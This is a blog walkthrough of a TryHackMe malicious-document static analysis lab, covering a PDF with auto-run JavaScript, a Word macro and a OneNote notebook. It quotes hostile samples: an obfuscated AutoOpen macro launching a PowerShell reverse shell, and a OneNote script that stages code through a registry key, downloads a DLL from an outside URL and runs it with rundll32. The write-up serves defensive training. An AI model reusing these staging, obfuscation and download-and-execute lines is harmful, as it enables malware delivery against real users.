---
title: "TryHackMe MalDoc Static Analysis: PDF, Office and OneNote"
date: 2026-08-29T20:04:00+05:30
lastmod: 2026-08-29T20:04:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-maldoc/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Malware Analysis
  - Static Analysis
  - REMnux
  - Maldoc
  - oletools
  - Phishing
  - Blue Team

draft: false
description: "TryHackMe MalDoc Static Analysis walkthrough: hex-encoded PDF JavaScript, a macro split across 15 concatenations, and a OneNote payload staged through the registry."
---

## MalDoc Static Analysis

Room 5 of 6 in the **Static Malware Analysis** module on SOC Level 2, and the one closest to what actually lands in a SOC inbox. [Basic Static Analysis](/post/thm-room-staticanalysis1/) was unlabelled binaries and [Script Static Analysis](/post/thm-room-scriptstaticanalysis/) was loose scripts. This room is the delivery vehicle itself: a PDF, a Word document and a OneNote notebook, each carrying code it has no business carrying.

The lab is a REMnux box reached over noVNC, with `pdfid`, `pdf-parser`, `box-js`, `oletools` and `onedump` already installed. I worked the whole room from an SSH shell instead of the graphical console, for reasons covered at the end.

## Task 3: Where maldocs sit in ATT&CK

Two questions straight from the task text. **Locky** is a **Ransomware** family, spread through Word attachments, and **Spearphishing Attachment** is sub-technique **T1566.001** under Phishing (T1566). Worth internalising the tree: T1566.001 is the attachment, .002 is the link, .003 is via service. Most maldoc work is .001.

## Task 5: Metadata before tooling

Before reaching for a parser, `strings` answers the first question:

```bash
strings simple.pdf | grep -iE "author|creator|producer|PDF-"
# %PDF-1.7
# /Author (Ben)
# /Creator <FEFF004D006900630072006F0073006F0066007400AE0020...>
# <dc:creator><rdf:Seq><rdf:li>Ben</rdf:li></rdf:Seq></dc:creator>
```

Author **Ben**. Note the `/Creator` and `/Producer` values are UTF-16BE hex with a `FEFF` byte-order mark, which decodes to "Microsoft Word for Microsoft 365". The XMP block further down repeats the same facts in plain XML, which is a useful redundancy: when one metadata store is stripped, the other often is not.

## Task 6: The JavaScript is not encrypted, just hex

`pdfid.py` gives the shape of the document in one pass:

```bash
pdfid.py simple.pdf
# obj                   18
# stream                 3
# /JS                    1
# /JavaScript            1
# /OpenAction            1
# /Launch                0
# /EmbeddedFile          0
```

**1** `/OpenAction`, which is the part that matters: it means something runs on open without any user interaction. Pulling the object:

```bash
pdf-parser.py --search javascript simple.pdf
# obj 6 0
#  Type: /Action
#    /S /JavaScript
#    /JS <6170702E616C657274282254484D7B4C75636B696C795F546869735F49736E27745F4861726D66756C7D22293B0A>
```

That is not encryption, it is a PDF hex string. Decoding it gives `app.alert("THM{Luckily_This_Isn't_Harmful}");`, so the flag is **THM{Luckily_This_Isn't_Harmful}**.

The encoded-objects question needed a second pass. `pdf-parser.py --stats` does not list which objects carry filters, and grepping the full dump for `FlateDecode` prints two anonymous matches with no object numbers attached. The flag that actually names them is `--search`:

```bash
pdf-parser.py --search FlateDecode simple.pdf | grep -E "^obj"
# obj 15 0
# obj 18 0
```

**2** encoded objects, numbered **15,18**. Cross-checking with `pdf-parser.py -f` confirms exactly three objects contain streams (4, 15, 18), and object 4 is the uncompressed XMP metadata.

{{< ad >}}

## Task 7: Letting box-js do the deobfuscation

Task 7 hands over `embedded-code.js`, 127 KB of obfuscation with randomised variable names. Rather than unpick it by hand, `box-js` executes it in a sandboxed emulation of the Windows Script Host and records the behaviour:

```bash
cd /home/remnux/Javascript-code
box-js embedded-code.js --timeout 20
# [info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
# [info] IOC: The script fetched an URL.
# [info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
# ...
```

It writes an `embedded-code.js.results/` directory, and the file holding the network IOCs is **urls.json**:

```bash
cat embedded-code.js.results/urls.json
# [
#   "https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/",
#   "http://aristonbentre.com/slideshow/O1uPzXd2YscA/",
#   ... 9 entries total
# ]
```

**9** URLs, and the slideshow one defangs to `hxxp[://]aristonbentre[.]com/slideshow/O1uPzXd2YscA/`. Nine live-ish hosts for one payload is the normal Emotet-style pattern: the loader walks the list until one answers, so blocking a single domain achieves nothing.

## Task 8: A macro split so no line is greppable

`oleid` triages the Word document in one command:

```bash
oleid suspicious.doc
# File format          | MS Word 97-2003 Document or Template
# Container format     | OLE
# Author               | CMNatic
# VBA Macros           | Yes, suspicious          | HIGH
```

Author **CMNatic**. `olevba` then shows **2** macro streams, `ThisDocument.cls` (empty) and `NewMacros.bas`, with `AutoOpen` and `Document_Open` both routing into one subroutine:

```vbnet
Sub AutoOpenMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e bGllbnQgPSBOZXctT"
    Str = Str + "2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoImh"
    Str = Str + "0dHA6Ly90aG1yZWR0ZWFtLnRobS9zdGFnZTIuZXhlIiw0NDQ0K"
    ' ... 15 fragments in total
    CreateObject("Wscript.Shell").Run Str
End Sub
```

The splitting is the whole trick. The base64 is broken across fifteen `Str = Str +` concatenations so that no single line contains a recognisable blob, and the command is only assembled in memory at run time. Decoding the joined string gives a PowerShell TCP reverse shell that pulls **http://thmredteam.thm/stage2.exe** on port 4444.

Two dead giveaways sit in the keyword table regardless of the obfuscation: `AutoExec` on both `AutoOpen` and `Document_Open`, and `Suspicious` on `Wscript.Shell` and `powershell`. Auto-execution plus a shell object is enough to convict a document without ever decoding the payload.

## Task 9: A payload that launders itself through the registry

`onedump.py` enumerates the OneNote file:

```bash
onedump.py invoice.one
# 1: 0x00001740 .... ffd8ffe2 0x00015b4f ...
# 3: 0x0002ae58 .PNG 89504e47 0x000000ef ...
# 5: 0x0002bc60 <htm 3c68746d 0x00000817 ...
# 6: 0x0002d628 <htm 3c68746d 0x00005c19 ...
```

**6** objects: two JPEGs, two PNGs and two HTML files. Object 5 is the interesting one, and its obfuscation is the cheapest possible: `5&` inserted between every character.

```html
d5&e5&x5&15&.5&p5&n5&g5&,5&W5&i5&n5&d5&"5&,5& 5&"5&"5&,5& 5&"5&o5&p5&e5&n5&"...
<script language="vbscript">
Dim ws : Set ws = CreateObject("WScript.Shell")
ws.RegWrite "HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values", content, "REG_SZ"
</script>
<script language="javascript">
var body = ws.RegRead("HKCU\\SOFTWARE\\Andromedia\\Mp4ToAvi\\Values");
var func = Function("url", body.replace(/5&/g, ""));
func("https://unitedmedicalspecialties.com/T1Gpp/OI.png");
</script>
<script language="vbscript">
ws.RegDelete("HKCU\SOFTWARE\Andromedia\Mp4ToAvi\Values")
</script>
```

Read the order of operations, because it is the point of the sample. The obfuscated body is written to a registry value, read straight back out, passed to `Function()` to build a callable, executed, and then the registry key is **deleted**. The payload exists on disk only as `5&`-padded noise and in the registry only for a few milliseconds. Stripping the separator reveals what the function does:

```bash
sed 's/5&//g' obj5 | grep -oiE 'sleep.{0,40}|curl.{0,160}'
# sleep(millis){var date = new Date();var curDa
# curl.exe --output C:\\ProgramData\\index1.png --url " + url, 0);sleep(15000);
#   var shell = new ActiveXObject("shell.application");
#   shell.shellexecute("rundll32", "C:\\...
```

Sleep value **15000** (15 seconds, a crude sandbox-timeout evasion), and the download is saved as **index1.png**.

That last answer is where the answer mask earned its keep. The URL visible in the clear is `.../T1Gpp/OI.png`, and `OI.png` is the tempting answer. The mask is `******.***`, six characters before the dot, which rules it out and points at the `--output` filename instead. The `.png` extension is cosmetic in both cases: the file is a DLL, which is why the next line runs it with `rundll32` rather than opening it.

## The lab, honestly

I could not drive this VM's graphical console at all. The room ships REMnux over **noVNC**, and the VNC canvas lives in a cross-origin iframe (`vnc.tryhackme.tech`). Synthetic mouse events did not reach it: the remote cursor moved exactly once, a stray double-click produced one rubber-band selection, and after that every click on the Applications menu was swallowed, in both the fullscreen view and the room's split view. The screen kept updating, so the stream was alive; only input was dead. This is a different failure from the Guacamole repaint problem in the previous room, where input worked and only the canvas went stale.

The fix was to stop using the console. Every command above ran over SSH to the machine's internal IP, which is both more reliable and much faster than clicking through a remote desktop. If you are doing this room and the console fights you, that is the move.

One consequence worth stating plainly: this writeup has no terminal screenshots. The SSH session ended before I captured them, and re-establishing it needs a password I do not handle. Every code block above is genuine output from the run, transcribed rather than illustrated, and I would rather say so than ship fabricated terminal images.

## Two things worth keeping

**Reach for the flag that names things.** Three separate answers here came down to picking the right invocation rather than the right tool. `pdf-parser.py --stats` summarises but will not tell you *which* objects are Flate-encoded; `--search FlateDecode` does. Knowing a tool is installed is not the same as knowing which switch answers your question, and on a timed room that gap is most of the clock.

**Obfuscation is a detection opportunity, not just an obstacle.** The Word macro splits base64 across fifteen concatenations, and the OneNote file round-trips its payload through a registry value it immediately deletes. Neither makes the code harder to understand once you look; both make it far weirder than anything legitimate. A document that writes to `HKCU\SOFTWARE\...` and deletes the key in the same breath, or a `Str = Str +` chain fifteen deep, is a stronger signal than the payload it is hiding.

Room solved 100%: 10 tasks, 20 answers.
